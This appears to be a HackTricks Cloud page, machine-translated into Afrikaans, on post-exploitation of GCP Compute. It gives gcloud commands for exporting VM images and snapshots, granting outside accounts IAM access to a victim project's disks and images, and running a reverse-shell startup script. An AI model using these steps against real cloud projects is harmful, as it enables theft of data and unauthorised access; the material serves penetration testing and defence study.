# GCP - Compute Post Exploitation

<details>

<summary><strong>Leer AWS-hacking van nul tot held met</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Ander maniere om HackTricks te ondersteun:

* As jy jou **maatskappy in HackTricks wil adverteer** of **HackTricks in PDF wil aflaai**, kyk na die [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Kry die [**amptelike PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ontdek [**The PEASS Family**](https://opensea.io/collection/the-peass-family), ons versameling eksklusiewe [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Sluit aan by die** üí¨ [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** ons op **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Deel jou hacking-truuks deur PR's in te dien by die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github-repos.

</details>

## Rekenaar

Vir meer inligting oor Rekenaar en VPC (Netwerking) kyk:

{% content-ref url="../gcp-services/gcp-compute-instances-enum/" %}
[gcp-compute-instances-enum](../gcp-services/gcp-compute-instances-enum/)
{% endcontent-ref %}

### Voer & Inspekteer Beelde lokaal uit

Dit sal 'n aanvaller in staat stel om **toegang te verkry tot die data wat reeds in beelde bestaan** of **nuwe beelde van lopende VM's te skep** en toegang tot hul data te verkry sonder om toegang tot die lopende VM te h√™.

Dit is moontlik om 'n VM-beeld na 'n emmer uit te voer en dit dan af te laai en lokaal te koppel met die opdrag:

{% code overflow="wrap" %}
```bash
gcloud compute images export --destination-uri gs://<bucket-name>/image.vmdk --image imagetest --export-format vmdk
# The download the export from the bucket and mount it locally
```
{% endcode %}

Voordat hierdie aksie uitgevoer kan word, mag die aanvaller bevoegdhede oor die stoorbak benodig en beslis **bevoegdhede oor cloudbuild** aangesien dit die **diens** is wat gevra sal word om die uitvoer te doen.\
Verder moet die codebuild SA en die compute SA bevoorregte toestemmings h√™.\
Die cloudbuild SA `<project-id>@cloudbuild.gserviceaccount.com` benodig:

* roles/iam.serviceAccountTokenCreator
* roles/compute.admin
* roles/iam.serviceAccountUser

En die SA `<project-id>-compute@developer.gserviceaccount.com` benodig:

* roles/compute.storageAdmin
* roles/storage.objectAdmin

### Voer Snapshots & Disks uit en ondersoek dit plaaslik

Dit is nie direk moontlik om snapshots en skywe uit te voer nie, maar dit is moontlik om **'n snapshot in 'n skyf te omskep, 'n skyf in 'n prent** en volgens die **vorige afdeling**, die prent uit te voer om dit plaaslik te ondersoek

{% code overflow="wrap" %}
```bash
# Create a Disk from a snapshot
gcloud compute disks create [NEW_DISK_NAME] --source-snapshot=[SNAPSHOT_NAME] --zone=[ZONE]

# Create an image from a disk
gcloud compute images create [IMAGE_NAME] --source-disk=[NEW_DISK_NAME] --source-disk-zone=[ZONE]
```
{% endcode %}

### Inspekteer 'n Beeld deur 'n VM te skep

Met die doel om toegang te verkry tot die **data wat in 'n beeld gestoor is** of binne 'n **lopende VM** waar 'n aanvaller **'n beeld geskep het**, is dit moontlik om 'n eksterne rekening toegang te verleen oor die beeld:

```bash
gcloud projects add-iam-policy-binding [SOURCE_PROJECT_ID] \
--member='serviceAccount:[TARGET_PROJECT_SERVICE_ACCOUNT]' \
--role='roles/compute.imageUser'
```

en skep dan 'n nuwe VM daaruit:

```bash
gcloud compute instances create [INSTANCE_NAME] \
--project=[TARGET_PROJECT_ID] \
--zone=[ZONE] \
--image=projects/[SOURCE_PROJECT_ID]/global/images/[IMAGE_NAME]
```

As jy nie eksterne toegang tot jou beeld kon gee nie, kan jy 'n virtuele masjien (VM) met daardie beeld in die slagoffers se projek begin en die metadata gebruik om 'n omgekeerde skulp uit te voer om toegang tot die beeld te verkry deur die parameter by te voeg:

```bash
--metadata startup-script='#! /bin/bash
echo "hello"; <reverse shell>'
```

### Inspekteer 'n Oorsig/Disk deur dit aan 'n VM te heg

Met die doel om toegang te verkry tot die **data wat in 'n disk of 'n oorsig gestoor is, kan jy die oorsig omskep na 'n disk, 'n disk na 'n prent en die vorige stappe volg.**

Of jy kan **'n eksterne rekening toegang verleen** tot die disk (as die beginpunt 'n oorsig is, gee toegang tot die oorsig of skep 'n disk daarvan):

```bash
gcloud projects add-iam-policy-binding [PROJECT_ID] \
--member='user:[USER_EMAIL]' \
--role='roles/compute.storageAdmin'
```

**Koppel die skyf** aan 'n instansie:

```bash
gcloud compute instances attach-disk [INSTANCE_NAME] \
--disk [DISK_NAME] \
--zone [ZONE]
```

Monteer die skyf binne die VM:

1. **SSH in die VM**:

```sh
gcloud compute ssh [INSTANCE_NAME] --zone [ZONE]
```

2. **Identifiseer die Skyf**: Sodra jy binne die VM is, identifiseer die nuwe skyf deur die lys van skyf-toestelle te vertoon. Gewoonlik kan jy dit vind as `/dev/sdb`, `/dev/sdc`, ens.
3. **Formateer en Monteer die Skyf** (as dit 'n nuwe of rou skyf is):

* Skep 'n monteer punt:

```sh
sudo mkdir -p /mnt/disks/[MOUNT_DIR]
```

* Monteer die skyf:

```sh
sudo mount -o discard,defaults /dev/[DISK_DEVICE] /mnt/disks/[MOUNT_DIR]
```

As jy **nie toegang kan gee aan 'n eksterne projek** tot die afskrif of skyf nie, moet jy dalk hierdie aksies **uitvoer binne 'n instansie in dieselfde projek as die afskrif/skyf**.

<details>

<summary><strong>Leer AWS-hacking van nul tot held met</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Ander maniere om HackTricks te ondersteun:

* As jy wil sien dat jou **maatskappy geadverteer word in HackTricks** of **HackTricks aflaai in PDF-formaat**, kyk na die [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Kry die [**amptelike PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ontdek [**The PEASS Family**](https://opensea.io/collection/the-peass-family), ons versameling eksklusiewe [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Sluit aan by die** üí¨ [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** ons op **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Deel jou haktruuks deur PR's in te dien by die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github-opslag.

</details>
